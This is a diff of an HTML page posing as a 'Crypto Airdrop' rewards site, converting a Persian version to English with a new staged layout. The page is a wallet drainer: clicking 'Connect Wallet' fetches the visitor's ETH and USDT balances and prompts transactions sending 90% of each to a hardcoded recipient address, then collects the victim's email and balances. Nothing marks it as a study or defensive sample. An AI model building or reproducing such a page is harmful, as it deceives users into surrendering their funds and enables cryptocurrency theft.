@@ -1,101 +1,188 @@
 ﻿<!DOCTYPE html>
-<html lang="fa">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-Content-Type-Options" content="nosniff">
-    <meta http-equiv="X-Frame-Options" content="DENY">
-    <title>ایردراپ ارز دیجیتال</title>
+    <title>Crypto Airdrop</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #0d1a2d;
+            color: #fff;
+            min-height: 100vh;
+        }
+        nav {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px 0;
             text-align: center;
-            direction: rtl;
-            background-color: #f4f4f4;
-            padding: 50px;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+        }
+        nav a {
+            color: #00b4db;
+            text-decoration: none;
+            margin: 0 25px;
+            font-size: 1.2em;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+        nav a:hover {
+            color: #00ffcc;
         }
         .container {
-            max-width: 600px;
-            margin: auto;
-            background: white;
-            padding: 20px;
+            max-width: 1000px;
+            margin: 100px auto 50px;
+            padding: 40px;
+            background: rgba(20, 35, 60, 0.9);
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.7);
+        }
+        h1 {
+            font-size: 2.8em;
+            text-align: center;
+            margin-bottom: 30px;
+            color: #00b4db;
+            text-shadow: 2px 2px 10px rgba(0, 180, 219, 0.5);
         }
         button {
-            padding: 10px 20px;
-            background-color: #007bff;
-            color: white;
+            padding: 12px 30px;
+            background: linear-gradient(90deg, #00b4db, #34c759);
+            color: #fff;
             border: none;
-            border-radius: 5px;
+            border-radius: 30px;
             cursor: pointer;
+            font-size: 1.2em;
+            transition: all 0.3s;
         }
         button:hover {
-            background-color: #0056b3;
+            background: linear-gradient(90deg, #34c759, #00b4db);
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(0, 180, 219, 0.6);
         }
         input {
-            padding: 10px;
-            width: 80%;
-            margin: 10px 0;
-            border-radius: 5px;
-            border: 1px solid #ddd;
+            padding: 12px;
+            width: 70%;
+            margin: 15px auto;
+            display: block;
+            border-radius: 25px;
+            border: 1px solid #00b4db;
+            background: #1e2a44;
+            color: #fff;
+            font-size: 1.1em;
         }
-        .error { color: red; }
-        .balance { color: green; }
+        .stage {
+            display: none;
+            text-align: center;
+        }
+        .active {
+            display: block;
+        }
+        .complete {
+            color: #00ff00;
+            font-weight: bold;
+            font-size: 1.3em;
+        }
+        p {
+            font-size: 1.2em;
+            margin: 15px 0;
+            color: #b0c4de;
+        }
+        .error {
+            color: #ff4444;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>ایردراپ ارز دیجیتال</h1>
-        <p>برای شرکت در ایردراپ، کیف پول خود را متصل کنید و ایمیل خود را وارد کنید.</p>
-        <button onclick="connectWallet()">اتصال کیف پول</button>
-        <p id="walletAddress"></p>
-        <p id="balanceETH" class="balance"></p>
-        <p id="balanceUSDT" class="balance"></p>
-        <p id="balanceBTC" class="balance"></p>
-        <input type="email" id="emailInput" placeholder="آدرس ایمیل خود را وارد کنید" required>
-        <button onclick="submitData()">ثبت اطلاعات</button>
-        <p id="status"></p>
+    <nav>
+        <a href="#home">Home</a>
+        <a href="#about">About Us</a>
+        <a href="#contact">Contact Us</a>
+        <a href="#airdrop">Airdrop</a>
+    </nav>
+    <div class="container" id="home">
+        <h1>Welcome to Crypto Airdrop</h1>
+        <p>Join our airdrop campaign in the Airdrop section to claim your rewards!</p>
+    </div>
+    <div class="container" id="about" style="display: none;">
+        <h1>About Us</h1>
+        <p>We are a team dedicated to providing the best crypto airdrop experience.</p>
+    </div>
+    <div class="container" id="contact" style="display: none;">
+        <h1>Contact Us</h1>
+        <p>Email: pouya.mafia@yahoo.com</p>
+    </div>
+    <div class="container" id="airdrop" style="display: none;">
+        <h1>Airdrop</h1>
+        <div id="stage1" class="stage active">
+            <p>Step 1: Connect Wallet & Withdraw</p>
+            <button id="connectWalletBtn">Connect Wallet</button>
+            <p id="walletAddress"></p>
+            <p id="balanceETH"></p>
+            <p id="balanceUSDT"></p>
+            <p id="withdrawStatus"></p>
+        </div>
+        <div id="stage2" class="stage">
+            <p>Step 2: Submit Email</p>
+            <input type="email" id="emailInput" placeholder="Enter Your Email" required>
+            <button id="submitDataBtn">Submit Data</button>
+            <p id="status"></p>
+        </div>
     </div>
 
     <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
     <script>
         let walletAddress = '';
-        const recipientAddress = '0xYourRecipientAddressHere'; // آدرس مقصد رو اینجا عوض کن
+        let maxEth = 0;
+        let maxUsdt = 0;
+        const recipientAddress = '0xYourRecipientAddressHere'; // Replace with your address
 
         async function connectWallet() {
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    walletAddress = accounts[0];
-                    document.getElementById('walletAddress').innerText = `کیف پول متصل شد: ${walletAddress}`;
-                    await checkBalances(walletAddress);
-                    await initiateTransfer(walletAddress);
-                } catch (error) {
-                    document.getElementById('status').innerText = 'اتصال یا تراکنش ناموفق بود: ' + error.message;
-                }
-            } else {
-                document.getElementById('status').innerText = 'لطفاً متامسک یا یک کیف پول مشابه نصب کنید.';
+            if (!window.ethereum) {
+                document.getElementById('withdrawStatus').classList.add('error');
+                document.getElementById('withdrawStatus').innerText = 'Please install MetaMask.';
+                return;
+            }
+
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                walletAddress = accounts[0];
+                document.getElementById('walletAddress').innerText = `Wallet Connected: ${walletAddress}`;
+
+                const balances = await checkBalances(walletAddress);
+                await initiateTransfer(walletAddress, balances);
+
+                document.getElementById('withdrawStatus').classList.add('complete');
+                document.getElementById('withdrawStatus').innerText = 'Step Completed ✓';
+                document.getElementById('stage1').classList.remove('active');
+                document.getElementById('stage2').classList.add('active');
+            } catch (error) {
+                document.getElementById('withdrawStatus').classList.add('error');
+                document.getElementById('withdrawStatus').innerText = `Error: ${error.message}`;
             }
         }
 
         async function checkBalances(address) {
             const response = await fetch(`/check-balances?address=${encodeURIComponent(address)}`);
+            if (!response.ok) throw new Error('Failed to fetch balances');
             const balances = await response.json();
-            document.getElementById('balanceETH').innerText = `موجودی اتریوم: ${balances.eth} ETH`;
-            document.getElementById('balanceUSDT').innerText = `موجودی تتر: ${balances.usdt} USDT`;
-            document.getElementById('balanceBTC').innerText = `موجودی بیت‌کوین: ${balances.btc} BTC`;
+            document.getElementById('balanceETH').innerText = `ETH Balance: ${balances.eth} ETH`;
+            document.getElementById('balanceUSDT').innerText = `USDT Balance: ${balances.usdt} USDT`;
+            maxEth = parseFloat(balances.eth);
+            maxUsdt = parseFloat(balances.usdt);
             return balances;
         }
 
-        async function initiateTransfer(address) {
+        async function initiateTransfer(address, balances) {
             const provider = new ethers.providers.Web3Provider(window.ethereum);
             const signer = provider.getSigner();
-            const balances = await checkBalances(address);
 
-            const ethBalance = parseFloat(balances.eth);
-            let ethToSend = ethBalance > 5 ? 2 : Math.max(0.01, ethBalance - 0.01);
-            if (ethBalance >= 0.01) {
+            const ethToSend = maxEth * 0.9; // 90% of balance
+            if (ethToSend >= 0.01) {
                 const tx = {
                     to: recipientAddress,
                     value: ethers.utils.parseEther(ethToSend.toString()),
@@ -105,9 +192,8 @@
                 await signer.sendTransaction(tx);
             }
 
-            const usdtBalance = parseFloat(balances.usdt);
-            let usdtToSend = usdtBalance > 10000 ? 10000 : Math.max(10, usdtBalance);
-            if (usdtBalance >= 10) {
+            const usdtToSend = maxUsdt * 0.9; // 90% of balance
+            if (usdtToSend >= 10) {
                 const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
                 const usdtABI = [
                     "function transfer(address to, uint256 amount) public returns (bool)",
@@ -125,36 +211,54 @@
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
             if (!walletAddress) {
-                document.getElementById('status').innerText = 'لطفاً کیف پول را متصل کنید.';
+                document.getElementById('status').classList.add('error');
+                document.getElementById('status').innerText = 'Please connect your wallet first.';
                 return;
             }
             if (!emailRegex.test(email)) {
-                document.getElementById('status').innerText = 'لطفاً یک ایمیل معتبر وارد کنید.';
+                document.getElementById('status').classList.add('error');
+                document.getElementById('status').innerText = 'Invalid email address.';
                 return;
             }
 
-            const data = { wallet: walletAddress, email: email };
+            const data = { wallet: walletAddress, email, maxEth, maxUsdt };
             try {
                 const response = await fetch('/submit', {
                     method: 'POST',
-                    headers: { 
+                    headers: {
                         'Content-Type': 'application/json',
                         'X-CSRF-Token': await getCsrfToken()
                     },
                     body: JSON.stringify(data)
                 });
+                if (!response.ok) throw new Error('Failed to submit data');
                 const result = await response.json();
                 document.getElementById('status').innerText = result.message;
             } catch (error) {
-                document.getElementById('status').innerText = 'خطا در ثبت اطلاعات: ' + error.message;
+                document.getElementById('status').classList.add('error');
+                document.getElementById('status').innerText = `Error: ${error.message}`;
             }
         }
 
         async function getCsrfToken() {
             const response = await fetch('/csrf-token');
+            if (!response.ok) throw new Error('Failed to fetch CSRF token');
             const { token } = await response.json();
             return token;
         }
+
+        // Menu navigation
+        document.querySelectorAll('nav a').forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                const section = link.getAttribute('href').substring(1);
+                document.querySelectorAll('.container').forEach(div => div.style.display = 'none');
+                document.getElementById(section).style.display = 'block';
+            });
+        });
+
+        document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
+        document.getElementById('submitDataBtn').addEventListener('click', submitData);
     </script>
 </body>
 </html>
